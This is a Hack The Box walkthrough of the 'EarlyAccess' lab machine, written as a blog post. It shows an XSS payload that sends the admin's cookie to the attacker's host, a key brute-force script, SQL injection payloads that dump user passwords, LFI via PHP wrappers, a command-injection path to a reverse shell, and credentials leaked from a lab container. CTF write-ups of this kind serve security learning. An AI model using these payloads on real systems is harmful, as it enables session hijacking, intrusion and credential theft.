---
title: EarlyAccess
tags: 
    - SQL injection
    - XSS
    - Docker
    - Hard
cover: https://pbs.twimg.com/media/E-NIfKSWQAgqHno?format=jpg&name=4096x4096
date: 2022-02-14
description: "Hack The Box Machine - EarlyAccess writeup"
author: "Me"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Desc Text."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/<path_to_repo>/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

# Enumeration

## Open Port

```bash
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4aa/x4R1TiTar8MYr6XZGVABRzTfiQGV97w7EnWMV2JBd8+dm/I7wsGkaz6VrW0NhiUb3Blv0n37Uo69YElbnxTa7xrzDWwBmdgMTEOo9OYoCU5XI1BrT9BAPy2/OMHc6Z9XSTWOlxPypUumlGz7gTo6eEedcNjXucm4qmKqCygWpd85UUzjaBeDL6w7YSXHqY8UCXW1a33JzFqa2Yo5663+vdRbqjlUDQPljZ6+GZ9TnwmiViJnhM3Px7gsMZQP7RJKF2q6gpFyAN16RGOgtPSrbjGCdtfBPoVg1FHx2kqoPffHkYqtQ6dI9ndVwk5uOgjm16YM86b5uE5W6ze7
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEViYQSGFH9qKODrhpo9E6Qt3ob2z5P8c2tiuCth+LlZatU6kW6UGfNsf1au+JMlOd9m4DFK2Y/gbCnGG19g1Kg=
|   256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG1mV03hXdu0wBUDWrldFfH24kABXLzTDT/3uZBNJt/y
80/tcp  open  http     syn-ack ttl 62 Apache httpd 2.4.38
|_http-title: Did not follow redirect to https://earlyaccess.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
443/tcp open  ssl/http syn-ack ttl 62 Apache httpd 2.4.38
|_http-title: EarlyAccess
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.38 (Debian)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT/emailAddress=chr0x6eos@earlyaccess.htb/organizationalUnitName=IT/localityName=Vienna
| Issuer: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT/emailAddress=chr0x6eos@earlyaccess.htb/organizationalUnitName=IT/localityName=Vienna
```

## Sub Domain

{{< figure src="images/Untitled.png">}}

Found 2 subdomains. 

1. `dev.earlyaccess.htb`
2. `game.earlyaccess.htb`

## Enumerating Webpage

Following is the screenshot of `earlyaccess.htb`

{{< figure src="images/Untitled%201.png">}}

Following is the preview of  `game.earlyaccess.htb` 

{{< figure src="images/Untitled%202.png">}}

Following is the preview of  `dev.earlyaccess.htb` 

{{< figure src="images/Untitled%203.png">}}

If you have noticed by default it is admin login page. 

When we enter wrong credentials

{{< figure src="images/Untitled%204.png">}}

### Account Registration

There existed registration page in the `earlyaccess.htb` 

{{< figure src="images/Untitled%205.png">}}

Lets register our account maybe we should open our burp 🤔

Once logged in we are in dashboard

{{< figure src="images/Untitled%206.png">}}

I have option to send messages, receive them, store (which we don’t have access to), we got a forums page and finally place to enter the early access key.

{{< figure src="images/Untitled%207.png">}}

It seems like we can ask the admin to give use `game-key` for early access of the product. Lets try sending a message. 

{{< figure src="images/Untitled%208.png">}}

{{< figure src="images/Untitled%209.png">}}

We have received the reply 

{{< figure src="images/Untitled%2010.png">}}

*P.S if you are like why the screenshot of the website is in white them all of a sudden, cuz I moved from Firefox browser which had the extension for dark theme to burp embedded browser.* 

### Phishing

Lets try sending some phishing links 

{{< figure src="images/Untitled%2011.png">}}

**Failed** doesn’t work

### XSS

{{< figure src="images/Untitled%2012.png">}}

It looks like the username part is vulnerable to XSS. 

### Grabbing Admin Cookies - via XSS

I used payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) and got the cookie of the admin via XSS. 

```jsx
<script>document.location='http://10.10.14.90/XSS/grabber.php?c='+document.cookie</script>
```

{{< figure src="images/Untitled%2013.png">}}

I URL decoded the cookies I got, not sure if its really needed but for the safer side 

{{< figure src="images/Untitled%2014.png">}}

and then I copy pasted those cookies into the browser and visited home page, and the user changed to admin!

{{< figure src="images/Untitled%2015.png">}}

### Offline key validator

{{< figure src="images/Untitled%2016.png">}}

Let’s download and explore what it is. 

We have the following `[validate.py](http://validate.py)` in backup.zip

```python
#!/usr/bin/env python3
import sys
from re import match

class Key:
    key = ""
    magic_value = "XP" # Static (same on API)
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)

    def __init__(self, key:str, magic_num:int=346):
        self.key = key
        if magic_num != 0:
            self.magic_num = magic_num

    @staticmethod
    def info() -> str:
        return f"""
        # Game-Key validator #

        Can be used to quickly verify a user's game key, when the API is down (again).

        Keys look like the following:
        AAAAA-BBBBB-CCCC1-DDDDD-1234

        Usage: {sys.argv[0]} <game-key>"""

    def valid_format(self) -> bool:
        return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))

    def calc_cs(self) -> int:
        gs = self.key.split('-')[:-1]
        return sum([sum(bytearray(g.encode())) for g in gs])

    def g1_valid(self) -> bool:
        g1 = self.key.split('-')[0]
        r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
        if r != [221, 81, 145]:
            return False
        for v in g1[3:]:
            try:
                int(v)
            except:
                return False
        return len(set(g1)) == len(g1)

    def g2_valid(self) -> bool:
        g2 = self.key.split('-')[1]
        p1 = g2[::2]
        p2 = g2[1::2]
        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))

    def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value:
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False

    def g4_valid(self) -> bool:
        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]

    def cs_valid(self) -> bool:
        cs = int(self.key.split('-')[-1])
        return self.calc_cs() == cs

    def check(self) -> bool:
        if not self.valid_format():
            print('Key format invalid!')
            return False
        if not self.g1_valid():
            return False
        if not self.g2_valid():
            return False
        if not self.g3_valid():
            return False
        if not self.g4_valid():
            return False
        if not self.cs_valid():
            print('[Critical] Checksum verification failed!')
            return False
        return True

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Key.info())
        sys.exit(-1)
    input = sys.argv[1]
    validator = Key(input)
    if validator.check():
        print(f"Entered key is valid!")
    else:
        print(f"Entered key is invalid!")
```

🤔🤔🤔will have to go through this code I guess. 

## Key Generation Script

```python
from itertools import combinations
import os 
keys=[]

#[A-Z0-9]{5}
#(-[A-Z0-9]{5})
#(-[A-Z]{4}[0-9])
#(-[A-Z0-9]{5})
#(-[0-9]{1,5})

#KEY12-0P2F4-XPAA0-GAMD2-1309

list_three=[]

one="KEY12" #last two should be integers 
two="0P2F4" #first part => 0,2,4 second part => 1,3 sum(0,2,4) == sum(1,3)
three="XP" #first 4 Alpha last digit 2,3,4 will be magic num, 2,3,4 sum should be = X+P
four="GAMD2"

digit=[48 , 49 , 50 , 51 , 52 , 53 , 54 , 55 , 56 , 57 ]

alpha=[65 , 66 , 67 , 68 , 69 , 70 , 71 , 72 , 73 , 74 , 75 , 76 , 77 , 78 , 79 , 80 , 81 , 82 , 83 , 84 , 85 , 86 , 87 , 88 , 89 , 90]

alphanumeric=[48 , 49 , 50 , 51 , 52 , 53 , 54 , 55 , 56 , 57 ,65 , 66 , 67 , 68 , 69 , 70 , 71 , 72 , 73 , 74 , 75 , 76 , 77 , 78 , 79 , 80 , 81 , 82 , 83 , 84 , 85 , 86 , 87 , 88 , 89 , 90]

sum_XP=ord('X')+ord('P') #168

#three last 3 digits sum should be less than 168

#possible combinations:

lower=346

upper=405

comb_alpha = list(combinations(alpha, 2))

for i in comb_alpha:
	sum_alpha=sum(i)+sum_XP
	for j in digit:
		if(sum_alpha+j>=lower and sum_alpha+j<=upper):
			three+=chr(i[0])+chr(i[1])+chr(j)
			list_three.append(three)
			three="XP"

f=open("wordlist.txt","a");

counter=0
for i in list_three:
	sum1=sum(bytearray(one.encode()))
	sum2=sum(bytearray(two.encode()))
	sum3=sum(bytearray(i.encode()))
	sum4=sum(bytearray(four.encode()))
	check_sum=sum1+sum2+sum3+sum4
	if(check_sum>999 and check_sum<=9999):
		key=one+"-"+two+"-"+i+"-"+four+"-"+str(check_sum)
		f.write(key+"\n")
		res = os.popen('python validate.py '+key).read()
		if(res.strip()!="Entered key is valid!"):
			print(res)
		else:
			print(counter,end="\r")
		counter+=1
```

I used this wordlist in intruder and found the valid key., It took me more than 150 requests to find the valid one. It 

Lets register the key for a normal user and then visit the game subdomain. 

## Game

### SQL INJECTION

Lets play the game so our name appears in scoreboard. If you notice the score board after playing game Yours will be something like this it may error out if it as bad characters 

{{< figure src="images/Untitled%2017.png">}}

Lets try SQL injection now. 

I found union worked for  injection by using the payload `') union select 1,2,3 -- -` works without error, but when I tried with one more column it error-ed. 

Therefore I used the payload `') union select name,password,null from users -- -`

{{< figure src="images/Untitled%2018.png">}}

{{< figure src="images/Untitled%2019.png">}}

`gameover` is the password for admin.

## dev.earlyaccess.htb

{{< figure src="images/Untitled%2020.png">}}

Following is the request made when hashing function is used. 

{{< figure src="images/Untitled%2021.png">}}

Let’s see what could be the valid end point for file tools.

## File-Tools

{{< figure src="images/Untitled%2022.png">}}

file.php looks valid to me. Now lets fuzz parameter.

### Fuzzing parameter

I used [arjun](https://github.com/s0md3v/Arjun) tool to find the parameter, filepath and factor seem to be valid ones.

{{< figure src="images/Untitled%2023.png">}}

## Exploiting LFI

{{< figure src="images/Untitled%2024.png">}}

{{< figure src="images/Untitled%2025.png">}}

LFI exist but its restricted. 

Let’s try using php wrappers to work around this restriction.

{{< figure src="images/Untitled%2026.png">}}

```php
<?php
include_once "../includes/session.php";

function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}

try
{
    if(isset($_REQUEST['action']))
    {
        if($_REQUEST['action'] === "verify")
        {
            // VERIFIES $password AGAINST $hash

            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);

                $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
                header('Location: /home.php?tool=hashing');
                return;
            }
        }
        elseif($_REQUEST['action'] === "verify_file")
        {
            //TODO: IMPLEMENT FILE VERIFICATION
        }
        elseif($_REQUEST['action'] === "hash_file")
        {
            //TODO: IMPLEMENT FILE-HASHING
        }
        elseif($_REQUEST['action'] === "hash")
        {
            // HASHES $password USING $hash_function

            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
                if(!isset($_REQUEST['redirect']))
                {
                    echo "Result for Hash-function (" . $_REQUEST['hash_function'] . ") and password (" . $_REQUEST['password'] . "):<br>";
                    echo '<br>' . $hash;
                    return;
                }
                else
                {
                    $_SESSION['hash'] = $hash;
                    header('Location: /home.php?tool=hashing');
                    return;
                }
            }
        }
    }
    // Action not set, ignore
    throw new Exception("");
}
catch(Exception $ex)
{
    if($ex->getMessage() !== "")
        $_SESSION['error'] = htmlentities($ex->getMessage());

    header('Location: /home.php');
    return;
}
?>
```

Above is the source code for hash.php

That fragment of code is vulnerable to command injection + RCE  having debug enabled.

{{< figure src="images/Untitled%2027.png">}}

# Foothold

### Command Injection

{{< figure src="images/Untitled%2028.png">}}

let’s follow the redirect. Use debug=true or whatever after debug= so the if statement gets validated. 

{{< figure src="images/Untitled%2029.png">}}

Let’s get the reverse shell using this vulnerability. 

{{< figure src="images/Untitled%2030.png">}}

{{< figure src="images/Untitled%2031.png">}}

## www-data to user

{{< figure src="images/Untitled%2032.png">}}

{{< figure src="images/Untitled%2033.png">}}

nothing interesting lets check game’s folder for the same config.php

{{< figure src="images/Untitled%2034.png">}}

nothing useful. Maybe password reuse? Yes! Indeed. gameover is the password for *www-adm*

{{< figure src="images/Untitled%2035.png">}}

We are not still to user flag. 

## Enumeration to user

{{< figure src="images/Untitled%2036.png">}}

Seems interesting but I cannot SSH into that user. 

```
user=api
password=s3CuR3_API_PW!
```

{{< figure src="images/Untitled%2037.png">}}

Assuming we are in docker lets use [static binary for nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and look for interesting things.

{{< figure src="images/Untitled%2038.png">}}

{{< figure src="images/Untitled%2039.png">}}

```
172.18.0.100 - mysql.app_nw
172.18.0.101 - api.app_nw
172.18.0.102 - webserver
```

webserver is the current ip address and host. Let’s check api instance 

{{< figure src="images/Untitled%2040.png">}}

 

we have something on port 5000. Lets curl that see!

{{< figure src="images/Untitled%2041.png">}}

let’s use wget as the creds are present in the file,. Lots of lines. lets pull it to local and use jq to read it clearly 

{{< figure src="images/Untitled%2042.png">}}

we have the environment variables in this file and found the credentials. Let’s try to ssh as drew (to check password reuse 😉).

```jsx
"MYSQL_DATABASE=db",
        "MYSQL_USER=drew",
        "MYSQL_PASSWORD=drew",
        "MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
        "SERVICE_TAGS=dev",
        "SERVICE_NAME=mysql",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "GOSU_VERSION=1.12",
        "MYSQL_MAJOR=8.0",
        "MYSQL_VERSION=8.0.25-1debian10"
```

{{< figure src="images/Untitled%2043.png">}}